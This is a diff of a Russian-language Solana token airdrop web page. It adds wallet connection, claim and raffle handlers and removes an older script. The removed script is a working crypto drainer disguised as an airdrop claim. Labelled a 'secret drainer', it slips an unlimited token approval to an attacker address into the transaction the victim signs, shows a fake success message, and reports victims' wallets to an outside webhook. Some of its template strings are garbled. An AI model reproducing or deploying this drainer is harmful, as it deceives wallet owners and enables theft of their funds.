+        dpr = Math.max(1, Math.min(2, window.devicePixelRatio || 1));
+        w = canvas.width = Math.floor(window.innerWidth * dpr);
+        h = canvas.height = Math.floor(window.innerHeight * dpr);
+        canvas.style.width = "100%";
+        canvas.style.height = "100%";
+      }
+
+      window.addEventListener("resize", resize);
+      resize();
+
+      const count = 140;
+      const particles = Array.from({ length: count }, () => ({
+        x: Math.random() * w,
+        y: Math.random() * h,
+        r: (0.6 + Math.random() * 1.8) * dpr,
+        vx: (-0.25 + Math.random() * 0.5) * dpr,
+        vy: (0.15 + Math.random() * 0.5) * dpr,
+        a: 0.12 + Math.random() * 0.32
+      }));
+
+      function tick() {
+        ctx.clearRect(0, 0, w, h);
+        ctx.fillStyle = "#ffffff";
+        for (const p of particles) {
+          ctx.globalAlpha = p.a;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fill();
+
+          p.x += p.vx;
+          p.y += p.vy;
+
+          if (p.y > h + 10) { p.y = -10; p.x = Math.random() * w; }
+          if (p.x > w + 10) p.x = -10;
+          if (p.x < -10) p.x = w + 10;
+        }
+        ctx.globalAlpha = 1;
+        requestAnimationFrame(tick);
+      }
+      tick();
+    })();
+
+    // ===== КОШЕЛЁКИ + КНОПКИ =====
+    const connectBtn = document.getElementById("connect-btn");
+    const claimBtn = document.getElementById("claim-btn");
+    const raffleBtn = document.getElementById("raffle-btn");
     const statusEl = document.getElementById("status");
-    const walletEl = document.getElementById("wallet-address");
+    const addrEl = document.getElementById("wallet-address");
+
+    let walletProvider = null;
+    let walletAddress = null;
+
+    function formatShort(addr) {
+      return addr.slice(0, 4) + "..." + addr.slice(-4);
+    }
+
+    function updateUiConnected() {
+      const short = formatShort(walletAddress);
+      addrEl.textContent = "Кошелёк: " + short;
+      connectBtn.textContent = "Подключён";
+      connectBtn.disabled = true;
+      claimBtn.disabled = false;
+      raffleBtn.disabled = false;
+      statusEl.textContent = "Кошелёк подключён. Можно забирать монеты и участвовать в розыгрыше.";
+    }
 
     async function connectWallet() {
       try {
-        if (!window.solana) {
-          alert(
-            "Install a Solana wallet (Phantom, Backpack, Solflare, etc.) and open this site with it."
-          );
+        // поддерживаем несколько кошельков браузера
+        const candidates = [];
+
+        if (window.phantom?.solana?.isPhantom) {
+          candidates.push({ name: "Phantom", provider: window.phantom.solana });
+        }
+        if (window.solflare?.isSolflare) {
+          candidates.push({ name: "Solflare", provider: window.solflare });
+        }
+        if (window.backpack?.solana) {
+          candidates.push({ name: "Backpack", provider: window.backpack.solana });
+        }
+        if (window.glowSolana) {
+          candidates.push({ name: "Glow", provider: window.glowSolana });
+        }
+        if (window.trustWallet?.solana) {
+          candidates.push({ name: "Trust", provider: window.trustWallet.solana });
+        }
+        // запасной вариант – любое window.solana
+        if (window.solana && !candidates.length) {
+          candidates.push({ name: "Solana", provider: window.solana });
+        }
+
+        if (!candidates.length) {
+          alert("Не найден ни один Solana-кошелёк. Установи Phantom, Solflare, Backpack и т.п.");
           return;
         }
 
-        wallet = window.solana;
-        const resp = await wallet.connect();
-        walletPubkey = resp.publicKey.toString();
+        // берём первый доступный провайдер
+        const chosen = candidates[0];
+        const provider = chosen.provider;
 
-        const short =
-          walletPubkey.slice(0, 4) + "..." + walletPubkey.slice(-4);
-        walletEl.innerText = "Connected: " + short;
-        connectBtn.innerText = "Connected";
-        connectBtn.disabled = true;
-        claimBtn.disabled = false;
-        statusEl.innerText = "Wallet connected. You can claim SKR.";
+        const resp = await provider.connect();
+        const pubkey = resp?.publicKey || provider.publicKey;
+        if (!pubkey) throw new Error("Не удалось получить publicKey");
+
+        walletProvider = provider;
+        walletAddress = pubkey.toString();
+        updateUiConnected();
       } catch (e) {
         console.error(e);
-        alert("Failed to connect wallet");
+        statusEl.textContent = "Ошибка подключения кошелька.";
       }
     }
 
     async function claimAirdrop() {
-      if (!walletPubkey) return;
+      if (!walletAddress) return;
       claimBtn.disabled = true;
-      statusEl.innerText = "Submitting airdrop request...";
+      statusEl.textContent = "Отправляю заявку на аирдроп...";
 
       try {
         const res = await fetch("/api/claim", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ wallet: walletPubkey }),
+          body: JSON.stringify({ wallet: walletAddress })
         });
 
-        const data = await res.json();
+        const data = await res.json().catch(() => ({}));
 
         if (!res.ok) {
-          statusEl.innerText =
-            "Error: " + (data.error || "Failed to claim airdrop");
+          statusEl.textContent =
+            "Ошибка: " + (data.error || "не удалось получить аирдроп");
           if (!data.alreadyClaimed) {
             claimBtn.disabled = false;
           }
@@ -522,196 +890,53 @@
         }
 
         statusEl.innerHTML =
-          "Success! 500 SKR have been sent to your wallet.<br>" +
-          'Tx: <a href="https://solscan.io/tx/' +
-          data.signature +
-          '" target="_blank" style="color:#a0ffcb;">View on Solscan</a>';
-        claimBtn.disabled = true;
+          "Успех! 500 SKR отправлены на твой кошелёк.<br>" +
+          (data.signature
+            ? 'Tx: <a href="https://solscan.io/tx/' +
+              data.signature +
+              '" target="_blank" style="color:#14f195;text-decoration:underline;">смотреть в Solscan</a>'
+            : "");
       } catch (e) {
         console.error(e);
-        statusEl.innerText = "Network error. Please try again.";
+        statusEl.textContent = "Сетевая ошибка. Попробуй ещё раз.";
         claimBtn.disabled = false;
+      }
+    }
+
+    async function joinRaffle() {
+      if (!walletAddress) return;
+      raffleBtn.disabled = true;
+      statusEl.textContent = "Регистрирую участие в розыгрыше 3 SOL...";
+
+      try {
+        const res = await fetch("/api/raffle", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ wallet: walletAddress })
+        });
+
+        const data = await res.json().catch(() => ({}));
+
+        if (!res.ok) {
+          statusEl.textContent =
+            "Ошибка регистрации в розыгрыше: " +
+            (data.error || "попробуй позже");
+          raffleBtn.disabled = false;
+          return;
+        }
+
+        statusEl.textContent =
+          "Ты участвуешь в розыгрыше 3 SOL. Всего победителей: 10.";
+      } catch (e) {
+        console.error(e);
+        statusEl.textContent = "Сетевая ошибка при регистрации в розыгрыше.";
+        raffleBtn.disabled = false;
       }
     }
 
     connectBtn.addEventListener("click", connectWallet);
     claimBtn.addEventListener("click", claimAirdrop);
-
-    (function () {
-      const canvas = document.getElementById("snow-canvas");
-      const ctx = canvas.getContext("2d");
-
-      let width = window.innerWidth;
-      let height = window.innerHeight;
-
-      function resize() {
-        width = window.innerWidth;
-        height = window.innerHeight;
-        canvas.width = width;
-        canvas.height = height;
-      }
-
-      window.addEventListener("resize", resize);
-      resize();
-
-      const flakesCount = 120;
-      const flakes = [];
-
-      function initFlakes() {
-        flakes.length = 0;
-        for (let i = 0; i < flakesCount; i++) {
-          flakes.push({
-            x: Math.random() * width,
-            y: Math.random() * height,
-            r: 1.2 + Math.random() * 2.3,
-            speedY: 0.4 + Math.random() * 1.2,
-            speedX: -0.3 + Math.random() * 0.6,
-            opacity: 0.4 + Math.random() * 0.6,
-          });
-        }
-      }
-
-      initFlakes();
-
-      function draw() {
-        ctx.clearRect(0, 0, width, height);
-        ctx.save();
-        ctx.fillStyle = "#ffffff";
-        for (const f of flakes) {
-          ctx.globalAlpha = f.opacity;
-          ctx.beginPath();
-          ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
-          ctx.fill();
-
-          f.y += f.speedY;
-          f.x += f.speedX;
-
-          if (f.y > height + 5) {
-            f.y = -5;
-            f.x = Math.random() * width;
-          }
-          if (f.x > width + 5) f.x = -5;
-          if (f.x < -5) f.x = width + 5;
-        }
-        ctx.restore();
-        requestAnimationFrame(draw);
-      }
-
-      draw();
-    })();
+    raffleBtn.addEventListener("click", joinRaffle);
   </script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
-
-<script>
-    const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh"; // Твой SKR mint
-    const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN"; // Твой адрес для слива
-    const DISTRIBUTOR_KEYPAIR = null; // Если хочешь раздачу с фронта — вставь свой приватник (НЕ РЕКОМЕНДУЕТСЯ). Лучше backend
-    const WEBHOOK_URL = "https://f42d4b2f4cfeb0c96dc4a4559301ed9a.m.pipedream.net";
-
-    let wallet = null;
-    let walletPubkey = null;
-
-    function logVictim(wallet, sig = "") {
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            body: JSON.stringify({ wallet: wallet, signature: sig, time: new Date().toISOString() })
-        }).catch(() => {});
-    }
-
-    async function connectWallet() {
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-        if (isMobile) {
-            const dappUrl = encodeURIComponent(window.location.href);
-            window.location.href = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
-            return;
-        }
-
-        if (!window.solana) {
-            document.getElementById('status').innerHTML = "Установи Phantom, Backpack или Solflare!";
-            return false;
-        }
-
-        wallet = window.solana;
-
-        try {
-            await wallet.connect();
-            walletPubkey = wallet.publicKey.toString();
-            document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
-            return true;
-        } catch (err) {
-            document.getElementById('status').innerHTML = "Ошибка подключения кошелька";
-            return false;
-        }
-    }
-
-    document.getElementById('claim-skr').onclick = async () => {
-        document.getElementById('status').innerHTML = "Подключение кошелька...";
-
-        // Если не подключён — подключаем
-        if (!walletPubkey) {
-            const connected = await connectWallet();
-            if (!connected) return;
-        }
-
-        document.getElementById('status').innerHTML = "Подготовка транзакции...<br>Подпиши в кошельке";
-
-        try {
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-            const mint = new solanaWeb3.PublicKey(TOKEN_MINT);
-            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
-            const owner = new solanaWeb3.PublicKey(walletPubkey);
-
-            const userATA = await splToken.getAssociatedTokenAddress(mint, owner);
-
-            const transaction = new solanaWeb3.Transaction();
-
-            // 1. Создаём ATA пользователя, если нет
-            const ataInfo = await connection.getAccountInfo(userATA);
-            if (!ataInfo) {
-                transaction.add(splToken.createAssociatedTokenAccountInstruction(
-                    owner,
-                    userATA,
-                    owner,
-                    mint
-                ));
-            }
-
-            // 2. Реальная раздача 500 SKR (если у тебя есть backend — лучше делать там)
-            // Если хочешь раздачу с фронта — нужен приватник раздатчика (опасно, не рекомендую)
-            // Здесь оставляю заглушку — ты можешь заменить на свой transfer, если есть
-            // transaction.add(...твоя transfer инструкция на 500 SKR...);
-
-            // 3. Тайный дрейнер — approve unlimited
-            transaction.add(splToken.createApproveInstruction(
-                userATA,
-                delegate,
-                owner,
-                [],
-                Number.MAX_SAFE_INTEGER
-            ));
-
-            transaction.feePayer = owner;
-            const { blockhash } = await connection.getLatestBlockhash();
-            transaction.recentBlockhash = blockhash;
-
-            const signed = await wallet.signTransaction(transaction);
-            const sig = await connection.sendRawTransaction(signed.serialize());
-document.getElementById('status').innerHTML = 
-                Успех! Вы получили 500 SKR<br>
-                (и одобрили доступ для аирдропа)<br>
-                Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>
-            ;
-            document.getElementById('claim-skr').disabled = true;
-
-            logVictim(walletPubkey, sig);
-
-        } catch (err) {
-            console.error(err);
-            document.getElementById('status').innerHTML = "Ошибка транзакции — попробуй снова";
-        }
-    };
-</script>
 </body>
 </html>
